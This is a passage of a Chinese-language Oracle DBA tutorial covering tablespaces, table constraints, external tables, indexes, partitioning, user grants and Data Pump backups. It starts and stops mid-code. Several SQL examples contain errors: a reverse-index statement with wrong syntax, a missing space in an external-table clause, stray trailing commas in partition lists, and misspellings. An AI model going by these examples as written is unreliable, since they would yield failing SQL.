<span class="token keyword">TO</span> <span class="token string">'/DISK2/system_01.dbf'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 更改数据库的存储参数 */</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> summit<span class="token punctuation">.</span>employee PCTFREE <span class="token number">30</span> PCTUSED <span class="token number">50</span> STORAGE<span class="token punctuation">(</span><span class="token keyword">NEXT</span> 500K MINEXTENTS <span class="token number">2</span> MAXEXTENTS <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 表空间的数据迁移 */</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> employee MOVE <span class="token keyword">TABLESPACE</span> data1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 获取表空间的大小信息 */</span><span class="token keyword">SELECT</span> TABLESPACE_NAME<span class="token punctuation">,</span> <span class="token function">SUM</span><span class="token punctuation">(</span>BYTES<span class="token punctuation">)</span> <span class="token keyword">FROM</span> DBA_DATA_FILES <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> TABLESPACE_NAME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 获取表空间的剩余大小信息 */</span><span class="token keyword">SELECT</span> TABLESPACE_NAME<span class="token punctuation">,</span> <span class="token function">SUM</span><span class="token punctuation">(</span>BYTES<span class="token punctuation">)</span> <span class="token keyword">FROM</span> DBA_FREE_SPACE <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> TABLESPACE_NAME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5-4-表的创建与管理"><a href="#5-4-表的创建与管理" class="headerlink" title="5.4. 表的创建与管理"></a>5.4. 表的创建与管理</h3><h4 id="5-4-1-创建表"><a href="#5-4-1-创建表" class="headerlink" title="5.4.1. 创建表"></a>5.4.1. 创建表</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> example<span class="token punctuation">(</span>    ID Number<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>    NAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    ………………    TOTAL_SCORE      NUMBER<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在数据库中，建表时一定要关注主键，即尽量都有主键，除非是一些流水表。</p></blockquote><h4 id="5-4-2-表约束"><a href="#5-4-2-表约束" class="headerlink" title="5.4.2. 表约束"></a>5.4.2. 表约束</h4><table><thead><tr><th align="center">约束类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">NOT NULL</td><td align="left">非空约束，字段值不可以为空</td></tr><tr><td align="center">UNIQUE</td><td align="left">唯一约束，字段值不可以重复</td></tr><tr><td align="center">PRIMARY</td><td align="left">主键约束，包括了非空约束和唯一约束</td></tr><tr><td align="center">FOREIGIN KEY</td><td align="left">外键约束，要求字段的值必须和另外一个表某个字段的值相匹配</td></tr><tr><td align="center">CHECK</td><td align="left">检查约束，该字段里面的值必须符合一个静态的条件（范围、枚举等）</td></tr><tr><td align="center">REF</td><td align="left">关联约束。其中的一列或者是多列是其他的表中的值</td></tr></tbody></table><p>除此之外，表约束还有一个延迟性设置（默认是非延迟的）。</p><p>在非延迟（Initially Immediate）情况下，任何的修改都会马上进行约束校验。而在延迟（Intially Deferred）情况下，当所有修改都完成并commit的时候才会进行约束校验，此时可能会因约束问题引发回滚，因此一般都避免设置为延迟校验。</p><h4 id="5-4-3-数据类型"><a href="#5-4-3-数据类型" class="headerlink" title="5.4.3. 数据类型"></a>5.4.3. 数据类型</h4><p><img src="./03.png"></p><h4 id="5-4-4-外部表"><a href="#5-4-4-外部表" class="headerlink" title="5.4.4. 外部表"></a>5.4.4. 外部表</h4><p>外部表是在数据库以外的文件系统上存储的只读表，它是按一定格式分割的文本文件或者其他类型的表，例如EXCEL、CSV等文件。外部表对于Oracle数据库来说，就好比是一张视图，在数据库中可以像视图一样进行查询等操作。这个视图允许用户在外部数据上运行任何的SQL语句，而不需要先将外部表中的数据装载进数据库中。</p><p>建立一个在“/opt/directory/test”目录下并以“,”作为数据分隔的外部表的步骤如下：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 创建目录Directory */</span><span class="token keyword">CREATE</span> DIRECTORY TestTable_dir <span class="token keyword">AS</span> <span class="token string">'/opt/directory/test'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* 创建外部表 */</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> TestTable<span class="token punctuation">(</span>    ID VARCHAR2<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    NAME VARCHAR2<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">TYPE</span> VARCHAR2<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    AGE VARCHAR2<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span> ORGANIZATION EXTERNAL<span class="token punctuation">(</span>    TYPEORACLE_LOADER    <span class="token keyword">DEFAULT</span> DIRECTORY TestTable_dir    ACCESS PARAMETERS<span class="token punctuation">(</span><span class="token keyword">fields</span> <span class="token keyword">terminated by</span> <span class="token string">','</span><span class="token punctuation">)</span>    LOCATION<span class="token punctuation">(</span><span class="token string">'TestTable.csv'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-5-索引管理"><a href="#5-5-索引管理" class="headerlink" title="5.5. 索引管理"></a>5.5. 索引管理</h3><h4 id="5-5-1-索引分类"><a href="#5-5-1-索引分类" class="headerlink" title="5.5.1. 索引分类"></a>5.5.1. 索引分类</h4><ul><li><strong>逻辑划分</strong>：单行索引、复合索引、唯一索引、非唯一索引、函数索引</li><li><strong>物理划分</strong>：反转索引、分区索引、全局索引、B-map索引、B-tree索引</li></ul><h4 id="5-5-2-索引管理"><a href="#5-5-2-索引管理" class="headerlink" title="5.5.2. 索引管理"></a>5.5.2. 索引管理</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 创建B-TREE索引（系统默认） */</span><span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> orders_region_id_idx <span class="token keyword">ON</span> orders<span class="token punctuation">(</span>region_id<span class="token punctuation">)</span>PCTFREE <span class="token number">30</span> STORAGE<span class="token punctuation">(</span>INITIAL 200K <span class="token keyword">NEXT</span> 200K PCTINCREASE <span class="token number">0</span>     MAXEXTENTS <span class="token number">50</span><span class="token punctuation">)</span><span class="token keyword">TABLESPACE</span> indx<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 创建B-MAP索引 */</span><span class="token keyword">CREATE</span> BITMAP <span class="token keyword">INDEX</span> orders_region_id_idx <span class="token keyword">ON</span> orders<span class="token punctuation">(</span>region_id<span class="token punctuation">)</span>PCTFREE <span class="token number">30</span> STORAGE<span class="token punctuation">(</span>INITIAL 200K <span class="token keyword">NEXT</span> 200K PCTINCREASE <span class="token number">0</span>     MAXEXTENTS <span class="token number">50</span><span class="token punctuation">)</span><span class="token keyword">TABLESPACE</span> indx<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 使用reverse函数创建反转索引 */</span><span class="token keyword">CREATE</span> index_name <span class="token keyword">ON</span> tablename <span class="token punctuation">(</span>REVERSE<span class="token punctuation">(</span>ind_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 索引分析 */</span><span class="token keyword">ANALYZE</span> <span class="token keyword">INDEX</span> acct_no_idx VALIDATE STRUCTURE<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 查看索引利用情况 */</span><span class="token keyword">SELECT</span> <span class="token punctuation">(</span>DEL_LF_ROWS_LEN<span class="token operator">/</span>LF_ROWS_LEN<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span> <span class="token keyword">AS</span> index_usage <span class="token keyword">FROM</span> index_stats<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 重建索引 */</span><span class="token keyword">ALTER</span> <span class="token keyword">INDEX</span> acct_no_idx REBUILD<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 删除索引 */</span><span class="token keyword">DROP</span> <span class="token keyword">INDEX</span> index_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5-6-分区表管理"><a href="#5-6-分区表管理" class="headerlink" title="5.6. 分区表管理"></a>5.6. 分区表管理</h3><p>分区表：在逻辑上是一张整体表，但在物理上则是由多张离散的子表构成。</p><h4 id="5-6-1-范围分区（Range）"><a href="#5-6-1-范围分区（Range）" class="headerlink" title="5.6.1. 范围分区（Range）"></a>5.6.1. 范围分区（Range）</h4><p>Range分区是较常用的表分区方式之一，它以列的值的范围作为分区的划分条件，将记录存放到列值所在的Range分区中。</p><p>在建表的时候，需要指定用于分区的列，以及分区的范围值。如果某些记录暂无法预测范围，可以创建MAXVALUE分区，所有不在指定范围内的记录都会被存储到MAXVALUE所在分区中。</p><p>范围分区适用于大批数据量清理。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 范围分区表SQL样例 */</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> EXAMPLE <span class="token punctuation">(</span>    ID NUMBER<span class="token punctuation">,</span>    TIME <span class="token keyword">DATE</span><span class="token punctuation">)</span> <span class="token keyword">PARTITION</span> <span class="token keyword">BY</span> RANGE <span class="token punctuation">(</span>TIME<span class="token punctuation">)</span> <span class="token punctuation">(</span>    <span class="token keyword">PARTITION</span> p1 <span class="token keyword">VALUES</span> LESS THAN <span class="token punctuation">(</span>TO_DATE<span class="token punctuation">(</span><span class="token string">'2013-1-1'</span><span class="token punctuation">,</span><span class="token string">'YYYY-MM-DD'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">PARTITION</span> p2 <span class="token keyword">VALUES</span> LESS THAN <span class="token punctuation">(</span>TO_DATE<span class="token punctuation">(</span><span class="token string">'2013-2-1'</span><span class="token punctuation">,</span><span class="token string">'YYYY-MM-DD'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">PARTITION</span> p3 <span class="token keyword">VALUES</span> LESS THAN <span class="token punctuation">(</span>TO_DATE<span class="token punctuation">(</span><span class="token string">'2013-3-1'</span><span class="token punctuation">,</span><span class="token string">'YYYY-MM-DD'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">PARTITION</span> p4 <span class="token keyword">VALUES</span> LESS THAN <span class="token punctuation">(</span>MAXVALUE<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-6-2-哈希分区（Hash）"><a href="#5-6-2-哈希分区（Hash）" class="headerlink" title="5.6.2. 哈希分区（Hash）"></a>5.6.2. 哈希分区（Hash）</h4><p>对于那些无法有效划分范围的表，可以考虑使用Hash分区，Hash分区会将表中的数据平均分配到各个分区中，但由于列所在分区是依据列的Hash值自动分配，因此不能控制也不知道哪条记录会被放到哪个分区中，Hash分区也可以支持多个依赖列。</p><p>Hash分区的数量一般为2的幂，不然可能会出现数据分布不均匀的情况。</p><p>Hash分区的数据分散均匀，适合静态数据的表（如客户信息表），但不适合做数据清理。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 哈希分区SQL样例 */</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> TEST <span class="token punctuation">(</span>     TRANSACTION_ID NUMBER <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">,</span>     ITEM_ID NUMBER<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">)</span> <span class="token keyword">PARTITION</span> <span class="token keyword">BY</span> <span class="token keyword">HASH</span><span class="token punctuation">(</span>TRANSACTION_ID<span class="token punctuation">)</span> <span class="token punctuation">(</span>     <span class="token keyword">PARTITION</span> part_01 <span class="token keyword">TABLESPACE</span> tablespace01<span class="token punctuation">,</span>     <span class="token keyword">PARTITION</span> part_02 <span class="token keyword">TABLESPACE</span> tablespace02<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-6-3-列表分区（List）"><a href="#5-6-3-列表分区（List）" class="headerlink" title="5.6.3. 列表分区（List）"></a>5.6.3. 列表分区（List）</h4><p>List分区的分区列只能有一个，不能像Range或者Hash分区那样同时指定多个列做为分区依赖列，各个分区的列值必须明确指定。</p><p>在List分区时应该尽可能确定分区的所有列值，因为一旦插入的列值不在分区范围内，则插入/更新就会失败。因此建议使用List分区时，创建一个default分区以存储那些不在指定范围内的记录，类似Range分区中的MAXVALUE分区。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 列表分区SQL样例 */</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> CUSTADDR <span class="token punctuation">(</span>    ID VARCHAR2<span class="token punctuation">(</span><span class="token number">15</span> BYTE<span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>    AREACODE VARCHAR2<span class="token punctuation">(</span><span class="token number">4</span> BYTE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">PARTITION</span> <span class="token keyword">BY</span> LIST <span class="token punctuation">(</span>AREACODE<span class="token punctuation">)</span> <span class="token punctuation">(</span>     <span class="token keyword">PARTITION</span> t_list025 <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'025'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">PARTITION</span> t_list372 <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'372'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">PARTITION</span> t_list510 <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'510'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">PARTITION</span> p_other <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token keyword">DEFAULT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-6-4-组合分区"><a href="#5-6-4-组合分区" class="headerlink" title="5.6.4. 组合分区"></a>5.6.4. 组合分区</h4><p>在Oracle 10g中支持的组合分区只有两种类型：</p><ul><li>范围－哈希复合分区（Range-Hash）</li><li>范围－列表复合分区（Range-List）</li></ul><p>两种组合分区的根分区只能是Range分区，子分区则可以是Hash分区或List分区中的一种。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 范围－哈希复合分区SQL样例 */</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> emp_sub_template <span class="token punctuation">(</span>    DEPTNO NUMBER<span class="token punctuation">,</span>    EMPNAME <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    GRADE NUMBER<span class="token punctuation">)</span> <span class="token keyword">PARTITION</span> <span class="token keyword">BY</span> RANGE<span class="token punctuation">(</span>DEPTNO<span class="token punctuation">)</span>     SUBPARTITION <span class="token keyword">BY</span> <span class="token keyword">HASH</span><span class="token punctuation">(</span>EMPNAME<span class="token punctuation">)</span> SUBPARTITION template <span class="token punctuation">(</span>        SUBPARTITION <span class="token number">a</span> <span class="token keyword">TABLESPACE</span> ts1<span class="token punctuation">,</span>        SUBPARTITION <span class="token number">b</span> <span class="token keyword">TABLESPACE</span> ts2<span class="token punctuation">,</span>        SUBPARTITION <span class="token number">c</span> <span class="token keyword">TABLESPACE</span> ts3<span class="token punctuation">,</span>        SUBPARTITION <span class="token number">d</span> <span class="token keyword">TABLESPACE</span> ts4    <span class="token punctuation">)</span><span class="token punctuation">(</span>    <span class="token keyword">PARTITION</span> p1 <span class="token keyword">VALUES</span> LESS THAN <span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">PARTITION</span> p2 <span class="token keyword">VALUES</span> LESS THAN <span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">PARTITION</span> p3 <span class="token keyword">VALUES</span> LESS THAN <span class="token punctuation">(</span>MAXVALUE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 范围－列表复合分区SQL样例 */</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> quarterly_regional_sales <span class="token punctuation">(</span>    DEPTNO NUMBER<span class="token punctuation">,</span>    ITEM_NO VARCHAR2<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    TXN_DATE <span class="token keyword">DATE</span><span class="token punctuation">,</span>    TXN_AMOUNT NUMBER<span class="token punctuation">,</span>    STATE VARCHAR2<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">TABLESPACE</span> TS4 <span class="token keyword">PARTITION</span> <span class="token keyword">BY</span> RANGE <span class="token punctuation">(</span>TXN_DATE<span class="token punctuation">)</span>    SUBPARTITION <span class="token keyword">BY</span> LIST <span class="token punctuation">(</span>STATE<span class="token punctuation">)</span> <span class="token punctuation">(</span>        <span class="token keyword">PARTITION</span> q1_1999 <span class="token keyword">VALUES</span> LESS THAN                 <span class="token punctuation">(</span>TO_DATE<span class="token punctuation">(</span><span class="token string">'1-APR-1999'</span><span class="token punctuation">,</span><span class="token string">'DD-MON-YYYY'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">(</span>                SUBPARTITION q1_1999_northwest <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'OR'</span><span class="token punctuation">,</span> <span class="token string">'WA'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                SUBPARTITION q1_1999_southwest <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'AZ'</span><span class="token punctuation">,</span> <span class="token string">'UT'</span><span class="token punctuation">,</span> <span class="token string">'NM'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                SUBPARTITION q1_1999_northeast <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'NY'</span><span class="token punctuation">,</span> <span class="token string">'VM'</span><span class="token punctuation">,</span> <span class="token string">'NJ'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                SUBPARTITION q1_1999_southeast <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'FL'</span><span class="token punctuation">,</span> <span class="token string">'GA'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">PARTITION</span> q3_2000 <span class="token keyword">VALUES</span> LESS THAN        <span class="token punctuation">(</span>TO_DATE<span class="token punctuation">(</span><span class="token string">'1-OCT-2000'</span><span class="token punctuation">,</span><span class="token string">'DD-MON-YYYY'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">(</span>        SUBPARTITION q3_2000_northwest <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'OR'</span><span class="token punctuation">,</span> <span class="token string">'WA'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        SUBPARTITION q3_2000_southwest <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'AZ'</span><span class="token punctuation">,</span> <span class="token string">'UT'</span><span class="token punctuation">,</span> <span class="token string">'NM'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        SUBPARTITION q3_2000_northeast <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'NY'</span><span class="token punctuation">,</span> <span class="token string">'VM'</span><span class="token punctuation">,</span> <span class="token string">'NJ'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        SUBPARTITION q3_2000_southeast <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'FL'</span><span class="token punctuation">,</span> <span class="token string">'GA'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-7-用户管理"><a href="#5-7-用户管理" class="headerlink" title="5.7. 用户管理"></a>5.7. 用户管理</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 创建用户SQL样例 */</span><span class="token keyword">CREATE</span> <span class="token keyword">USER</span> user_name IDENTIFIED <span class="token punctuation">[</span> <span class="token keyword">BY</span> password <span class="token operator">|</span> EXTERNALLY <span class="token operator">|</span> GLOBALLY <span class="token keyword">AS</span> ‘external_name’ <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">TABLESPACE</span> tablespace_name <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token keyword">TEMPORARY</span> <span class="token keyword">TABLESPACE</span> temp_tablespace_name <span class="token punctuation">]</span><span class="token punctuation">[</span> QUOTA n K<span class="token operator">|</span>M<span class="token operator">|</span>UNLIMITED <span class="token keyword">ON</span> tablespace_name <span class="token punctuation">]</span><span class="token punctuation">[</span> PROFILE profile_name <span class="token punctuation">]</span><span class="token punctuation">[</span> PASSWORD EXPIRE <span class="token punctuation">]</span><span class="token punctuation">[</span> ACCOUNT <span class="token keyword">LOCK</span> <span class="token operator">|</span> UNLOCK <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 用户角色/方案授权SQL样例 */</span><span class="token keyword">GRANT</span> sys_list <span class="token keyword">to</span> user_list <span class="token operator">|</span> role_list <span class="token operator">|</span> <span class="token keyword">PUBLIC</span> <span class="token punctuation">[</span> <span class="token keyword">WITH</span> ADMIN <span class="token keyword">OPTION</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> resource<span class="token punctuation">,</span><span class="token keyword">connect</span> <span class="token keyword">TO</span> u1<span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">SELECT</span> <span class="token keyword">ON</span> scott<span class="token punctuation">.</span>emp <span class="token keyword">TO</span> u1<span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">UPDATE</span> <span class="token punctuation">(</span>sal<span class="token punctuation">,</span>comm<span class="token punctuation">)</span> <span class="token keyword">ON</span> scott<span class="token punctuation">.</span>emp <span class="token keyword">TO</span> u1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 回收用户权限SQL样例 */</span><span class="token keyword">REVOKE</span> sys_priv_list <span class="token keyword">FROM</span> user_list<span class="token operator">|</span> role_list<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 删除用户SQL样例 */</span><span class="token keyword">DROP</span> <span class="token keyword">USER</span> U1 <span class="token keyword">CASCADE</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">-- 方案中的所有对象都会被连带删除;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5-8-数据备份与迁移"><a href="#5-8-数据备份与迁移" class="headerlink" title="5.8. 数据备份与迁移"></a>5.8. 数据备份与迁移</h3><h4 id="5-8-1-impdp与expdp"><a href="#5-8-1-impdp与expdp" class="headerlink" title="5.8.1. impdp与expdp"></a>5.8.1. impdp与expdp</h4><p>impdb与expdb工具是在命令行环境中使用的（如Linux的终端、Windows的Dos），它需要Oracle客户端的支持。impdb与expdb仅支持在服务器本地执行数据迁移，不支持远程操作。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 全库备份 */</span>expdp system<span class="token operator">/</span>manager DIRECTORY<span class="token operator">=</span>dpdata1 <span class="token keyword">DUMPFILE</span><span class="token operator">=</span><span class="token keyword">full</span><span class="token punctuation">.</span>dmp <span class="token keyword">FULL</span><span class="token operator">=</span>y<span class="token punctuation">;</span>impdp system<span class="token operator">/</span>manager DIRECTORY<span class="token operator">=</span>dpdata1 <span class="token keyword">DUMPFILE</span><span class="token operator">=</span><span class="token keyword">full</span><span class="token punctuation">.</span>dmp <span class="token keyword">FULL</span><span class="token operator">=</span>y<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 按表空间备份 */</span>expdp system<span class="token operator">/</span>manager DIRECTORY<span class="token operator">=</span>dpdata1 <span class="token keyword">DUMPFILE</span><span class="token operator">=</span><span class="token keyword">tablespace</span><span class="token punctuation">.</span>dmp TABLESPACES<span class="token operator">=</span><span class="token keyword">temp</span><span class="token punctuation">,</span>example<span class="token punctuation">;</span>impdp system<span class="token operator">/</span>manager DIRECTORY<span class="token operator">=</span>dpdata1 <span class="token keyword">DUMPFILE</span><span class="token operator">=</span><span class="token keyword">tablespace</span><span class="token punctuation">.</span>dmp TABLESPACES<span class="token operator">=</span><span class="token keyword">temp</span><span class="token punctuation">,</span>example<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">/* 按表名备份 */</span>expdp scott<span class="token operator">/</span>tiger<span class="token variable">@orcl</span> <span class="token keyword">TABLES</span><span class="token operator">=</span>emp<span class="token 